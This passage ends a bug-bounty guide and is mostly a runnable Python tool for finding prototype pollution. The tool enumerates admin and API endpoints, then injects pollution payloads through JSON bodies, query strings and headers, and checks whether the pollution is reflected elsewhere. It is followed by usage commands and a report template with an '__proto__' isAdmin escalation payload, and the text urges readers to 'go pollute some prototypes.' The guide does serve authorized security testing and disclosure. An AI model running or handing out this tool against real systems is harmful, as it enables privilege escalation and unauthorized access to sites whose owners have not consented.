            "/api/admin", "/api/admin/users", "/api/admin/config",
            # Generic
            "/graphql", "/api/graphql", "/api/v1", "/api/v2",
            "/api/status", "/api/health", "/api/version",
            "/api/template", "/api/render", "/api/compile",
            # WebSocket
            "/ws", "/websocket", "/socket.io",
        ]
        
        discovered = []
        for path in common_api_paths:
            url = f"{self.base_url}{path}"
            try:
                r = self.session.get(url, timeout=self.timeout)
                if r.status_code not in [404, 403, 400]:
                    discovered.append({
                        "url": url,
                        "method": "GET",
                        "status": r.status_code,
                        "type": "GET endpoint"
                    })
                    print(f"  [+] {url} ({r.status_code})")
                
                # Also try POST
                r2 = self.session.post(url, json={}, timeout=self.timeout)
                if r2.status_code not in [404, 405]:
                    discovered.append({
                        "url": url,
                        "method": "POST",
                        "status": r2.status_code,
                        "type": "POST endpoint"
                    })
                    print(f"  [+] POST {url} ({r2.status_code})")
            except:
                pass
        
        self.endpoints_discovered = discovered
        print(f"  [*] Found {len(discovered)} potential endpoints\n")
        return discovered
    
    # ============================
    # JSON BODY INJECTION
    # ============================
    
    def test_json_payload(self, url: str, method: str = "POST", 
                          payload: Dict = None) -> Optional[Dict]:
        """Test a single JSON payload against an endpoint."""
        try:
            if method == "GET":
                r = self.session.get(url, params=payload)
            elif method == "PUT":
                r = self.session.put(url, json=payload)
            elif method == "PATCH":
                r = self.session.patch(url, json=payload)
            else:  # POST
                r = self.session.post(url, json=payload)
            
            result = {
                "url": url,
                "method": method,
                "payload": payload,
                "status": r.status_code,
                "response_preview": r.text[:500],
                "response_time": r.elapsed.total_seconds(),
            }
            
            # Check for success indicators
            for indicator in SUCCESS_INDICATORS:
                if indicator.lower() in r.text.lower():
                    result["indicator"] = indicator
                    result["vulnerable"] = True
                    return result
            
            # Check for error indicators (might be catching the pollution)
            for indicator in ERROR_INDICATORS:
                if indicator.lower() in r.text.lower():
                    result["indicator"] = f"Error indicator: {indicator}"
                    result["vulnerable"] = "possible"
                    return result
            
            result["vulnerable"] = False
            return result
            
        except Exception as e:
            return {
                "url": url,
                "method": method,
                "payload": payload,
                "error": str(e),
                "vulnerable": False
            }
    
    # ============================
    # QUERY STRING INJECTION
    # ============================
    
    def test_query_payload(self, url: str, query: str) -> Optional[Dict]:
        """Test query string-based Prototype Pollution."""
        full_url = f"{url}?{query}"
        try:
            r = self.session.get(full_url)
            
            result = {
                "url": full_url,
                "method": "GET",
                "payload": query,
                "status": r.status_code,
                "response_preview": r.text[:500],
            }
            
            for indicator in SUCCESS_INDICATORS:
                if indicator.lower() in r.text.lower():
                    result["indicator"] = indicator
                    result["vulnerable"] = True
                    return result
            
            result["vulnerable"] = False
            return result
            
        except Exception as e:
            return {"url": full_url, "error": str(e), "vulnerable": False}
    
    # ============================
    # HEADER INJECTION
    # ============================
    
    def test_header_payload(self, url: str, header_payload: Dict) -> Optional[Dict]:
        """Test header-based Prototype Pollution (unusual but worth trying)."""
        try:
            headers = {}
            for k, v in header_payload.items():
                if isinstance(v, dict):
                    headers[k] = json.dumps(v)
                else:
                    headers[k] = str(v)
            
            r = self.session.get(url, headers=headers)
            
            result = {
                "url": url,
                "method": "GET (header injection)",
                "payload": header_payload,
                "status": r.status_code,
                "response_preview": r.text[:500],
            }
            
            for indicator in SUCCESS_INDICATORS:
                if indicator.lower() in r.text.lower():
                    result["indicator"] = indicator
                    result["vulnerable"] = True
                    return result
            
            result["vulnerable"] = False
            return result
            
        except Exception as e:
            return {"url": url, "error": str(e), "vulnerable": False}
    
    # ============================
    # VERIFICATION (Deep Test)
    # ============================
    
    def verify_pollution(self, suspect_endpoint: Dict) -> Dict:
        """
        If a potential pollution was detected, run a verification 
        by sending two requests: one to pollute, one to verify.
        """
        url = suspect_endpoint["url"]
        payload = suspect_endpoint["payload"]
        method = suspect_endpoint["method"]
        
        print(f"  [!] Running deep verification on {url}...")
        
        # Step 1: Pollute
        try:
            if method == "GET":
                self.session.get(url, params=payload)
            elif method == "PUT":
                self.session.put(url, json=payload)
            else:
                self.session.post(url, json=payload)
        except:
            pass
        
        # Step 2: Verify by accessing a different endpoint that 
        # might reflect the polluted property
        test_paths = [
            "/api/status",
            "/api/version", 
            "/api/user",
            "/api/config",
            "/api/settings",
            "/",
            "/debug",
            "/health",
        ]
        
        verification_results = []
        for path in test_paths:
            test_url = f"{self.base_url}{path}"
            try:
                r = self.session.get(test_url)
                if "polluted" in r.text:
                    verification_results.append({
                        "url": test_url,
                        "found": "polluted",
                        "preview": r.text[:200]
                    })
                    print(f"    [CONFIRMED] Pollution reflected at {test_url}")
                if "yes" in r.text:
                    verification_results.append({
                        "url": test_url,
                        "found": "yes",
                        "preview": r.text[:200]
                    })
            except:
                pass
        
        suspect_endpoint["verification"] = verification_results
        suspect_endpoint["confirmed"] = len(verification_results) > 0
        
        return suspect_endpoint
    
    # ============================
    # SCAN ORCHESTRATOR
    # ============================
    
    def run_full_scan(self) -> List[Dict]:
        """Execute the complete scan pipeline."""
        print(BANNER)
        print(f"[*] Target: {self.base_url}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Payloads: {len(JSON_PAYLOADS)} JSON, {len(QUERY_PAYLOADS)} query, {len(HEADER_PAYLOADS)} header\n")
        
        # Phase 1: Discover endpoints
        endpoints = self.discover_endpoints()
        if not endpoints:
            print("[!] No endpoints discovered. Using base URL only.")
            endpoints = [{"url": self.base_url, "method": "POST", "type": "base"}]
        
        # Phase 2: Test JSON body injection
        print("[*] Phase 2: Testing JSON body injection...")
        json_tasks = []
        
        for endpoint in endpoints:
            url = endpoint["url"]
            method = endpoint.get("method", "POST")
            
            for payload in JSON_PAYLOADS:
                json_tasks.append((url, method, payload))
        
        # Run with thread pool
        json_results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_task = {
                executor.submit(self.test_json_payload, url, method, payload): 
                (url, method, payload)
                for url, method, payload in json_tasks
            }
            
            for future in concurrent.futures.as_completed(future_to_task):
                result = future.result()
                if result and result.get("vulnerable"):
                    json_results.append(result)
                    indicator = result.get("indicator", "unknown")
                    print(f"  [!!] POTENTIAL FINDING: {result['method']} {result['url']}")
                    print(f"       Indicator: {indicator}")
                    print(f"       Payload: {json.dumps(result['payload'])[:100]}...")
        
        if not json_results:
            print("  [*] No immediate vulnerabilities found via JSON injection.")
        
        # Phase 3: Test query string injection
        print("\n[*] Phase 3: Testing query string injection...")
        query_results = []
        
        for endpoint in endpoints:
            url = endpoint["url"]
            for query in QUERY_PAYLOADS:
                result = self.test_query_payload(url, query)
                if result and result.get("vulnerable"):
                    query_results.append(result)
                    print(f"  [!!] POTENTIAL FINDING: GET {result['url']}")
        
        if not query_results:
            print("  [*] No immediate vulnerabilities found via query string injection.")
        
        # Phase 4: Test header injection
        print("\n[*] Phase 4: Testing header injection...")
        header_results = []
        
        for endpoint in endpoints:
            url = endpoint["url"]
            for header_payload in HEADER_PAYLOADS:
                result = self.test_header_payload(url, header_payload)
                if result and result.get("vulnerable"):
                    header_results.append(result)
                    print(f"  [!!] POTENTIAL FINDING: {url} via headers")
        
        if not header_results:
            print("  [*] No immediate vulnerabilities found via header injection.")
        
        # Phase 5: Verify findings
        all_findings = json_results + query_results + header_results
        verified_findings = []
        
        if all_findings:
            print(f"\n[*] Phase 5: Verifying {len(all_findings)} potential findings...")
            for finding in all_findings:
                verified = self.verify_pollution(finding)
                verified_findings.append(verified)
        else:
            print("\n[*] Phase 5: No findings to verify.")
        
        self.findings = verified_findings
        return verified_findings
    
    # ============================
    # REPORT GENERATION
    # ============================
    
    def generate_report(self, output_file: str = "pp_report.json") -> str:
        """Generate a full report in JSON format."""
        report = {
            "target": self.base_url,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "endpoints_tested": len(self.endpoints_discovered),
            "summary": {
                "total_findings": len(self.findings),
                "confirmed": len([f for f in self.findings if f.get("confirmed")]),
                "potential": len([f for f in self.findings if not f.get("confirmed")]),
            },
            "findings": self.findings,
        }
        
        with open(output_file, "w") as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"\n[✓] Report saved to {output_file}")
        return output_file
    
    def print_summary(self):
        """Print a human-readable summary."""
        print("\n" + "="*60)
        print("SCAN SUMMARY")
        print("="*60)
        
        if not self.findings:
            print("\n[!] No Prototype Pollution vulnerabilities detected.")
            print("[*] This could mean:")
            print("    1. The application is patched against PP")
            print("    2. The entry points are different than tested")
            print("    3. Merging happens at a different layer")
            print("\n[*] Next steps:")
            print("    - Manually review JavaScript for merge operations")
            print("    - Check for WebSocket endpoints manually")
            print("    - Investigate if template engines are used")
            return
        
        confirmed = [f for f in self.findings if f.get("confirmed")]
        potential = [f for f in self.findings if not f.get("confirmed")]
        
        print(f"\n[!!] Found {len(confirmed)} CONFIRMED + {len(potential)} potential")
        
        for f in confirmed:
            print(f"\n  [CONFIRMED]")
            print(f"  URL:     {f.get('url', 'N/A')}")
            print(f"  Method:  {f.get('method', 'N/A')}")
            print(f"  Payload: {json.dumps(f.get('payload', {}))[:200]}")
            print(f"  Impact:  Requires manual assessment")
            print(f"  Response: {f.get('response_preview', 'N/A')[:200]}")


# ============================
# MAIN ENTRY POINT
# ============================

def main():
    parser = argparse.ArgumentParser(
        description="HackerAI Prototype Pollution Scanner — Bug Bounty Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 pp_scanner.py -u https://target.com
  python3 pp_scanner.py -u https://target.com/api -m POST -t 20
  python3 pp_scanner.py -u https://target.com --proxy http://127.0.0.1:8080
  python3 pp_scanner.py -u https://target.com -c "session=abc123" -H "X-CSRF: token"
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="Target URL (base)")
    parser.add_argument("-m", "--method", default="POST", 
                        choices=["POST", "GET", "PUT", "PATCH"],
                        help="HTTP method for JSON body tests")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Number of concurrent threads")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds")
    parser.add_argument("--proxy", help="Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-c", "--cookie", help="Cookie string")
    parser.add_argument("-H", "--header", action="append", 
                        help="Custom headers (can be used multiple times)")
    parser.add_argument("-o", "--output", default="pp_report.json",
                        help="Output report file")
    parser.add_argument("--no-verify", action="store_true",
                        help="Skip SSL verification")
    parser.add_argument("--quick", action="store_true",
                        help="Quick scan (skip discovery, test only base URL)")
    
    args = parser.parse_args()
    
    # Parse custom headers
    custom_headers = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                key, val = h.split(":", 1)
                custom_headers[key.strip()] = val.strip()
    
    # Parse cookies
    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()
    
    # Initialize scanner
    scanner = PrototypePollutionScanner(
        base_url=args.url,
        proxy=args.proxy,
        cookies=cookies,
        headers=custom_headers,
        threads=args.threads,
        timeout=args.timeout,
        verify_ssl=not args.no_verify,
    )
    
    try:
        if args.quick:
            # Quick scan: test base URL only
            print(BANNER)
            print(f"[*] Quick scan on {args.url}")
            
            for payload in JSON_PAYLOADS:
                result = scanner.test_json_payload(args.url, args.method, payload)
                if result and result.get("vulnerable"):
                    print(f"  [!!] POTENTIAL: {json.dumps(payload)[:100]}")
                    scanner.findings.append(result)
            
            print(f"\n[*] Quick scan complete. {len(scanner.findings)} potential findings.")
        else:
            # Full scan
            scanner.run_full_scan()
        
        # Generate report
        scanner.generate_report(args.output)
        scanner.print_summary()
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Scan failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
```

### Usage Examples

```bash
# Quick scan of an API endpoint
python3 pp_scanner.py -u https://target.com/api/update -m POST --quick

# Full recon scan
python3 pp_scanner.py -u https://target.com -t 20 --proxy http://127.0.0.1:8080

# With authentication cookies
python3 pp_scanner.py -u https://target.com -c "session=eyJ...; user=admin"

# Custom headers (e.g., CSRF token)
python3 pp_scanner.py -u https://target.com -H "X-CSRF-Token: abc123" -H "X-API-Key: secret"
```

---

## Bonus: Bug Bounty Report Template

When you find a valid Prototype Pollution vulnerability, here's a proven report structure:

```
Title: [DOM-based/Server-side] Prototype Pollution leading to [Impact]

Vulnerability Type: Prototype Pollution (CWE-1321)
Severity: Critical/High/Medium (CVSS 3.x: X.X)
Target: https://target.com
Endpoint: POST /api/v1/users/update

=== Summary ===
A Prototype Pollution vulnerability exists in [component/library], 
allowing an attacker to pollute Object.prototype via [entry point].

=== Steps to Reproduce ===
1. Send the following request:
   POST /api/v1/users/update HTTP/1.1
   Host: target.com
   Content-Type: application/json
   
   {"__proto__":{"isAdmin":true},"name":"test"}

2. Verify by accessing /api/v1/admin/dashboard
   → Previously 403, now returns 200 with admin panel

=== Proof of Concept ===
[curl command OR Burp screenshot]

=== Impact ===
[Description of what can be achieved, e.g.:]
- Privilege escalation to admin
- Access to other users' private data
- Potential for RCE via [template engine]

=== Root Cause ===
Recursive merge of user input without filtering __proto__ keys.

=== Remediation ===
1. Use safe JSON parsing with reviver
2. Use Object.create(null) for configuration objects
3. Update [library] to version [X.Y.Z]
4. Implement schema validation for all user inputs

=== References ===
- https://portswigger.net/web-security/prototype-pollution
- CVE-2019-11358 (jQuery)
- CVE-2019-10744 (Lodash)
```

---

## Final Thoughts

Prototype Pollution is one of the most **underrated** vulnerabilities in bug bounty — many hunters skip it because they don't know how to chain it. But as we've seen across millions of dollars in bounties:

1. **Every recursive merge is a potential entry point**
2. **Template engines are the best RCE gadgets**
3. **Client-side PP can give universal XSS**
4. **Server-side PP can escalate to full admin**
5. **CLI parsers and Electron apps expand the attack surface**

The key differentiator between a $500 finding and a $5,000+ finding is the **exploit chain**. Finding the pollution is step one. Finding the gadget that reads from the polluted prototype is what turns a low-severity finding into a critical one.

Happy hunting — you're fully equipped now. Go pollute some prototypes.

---

*This guide was written for authorized security professionals. All techniques are for legitimate security assessments and bug bounty hunting within scope.*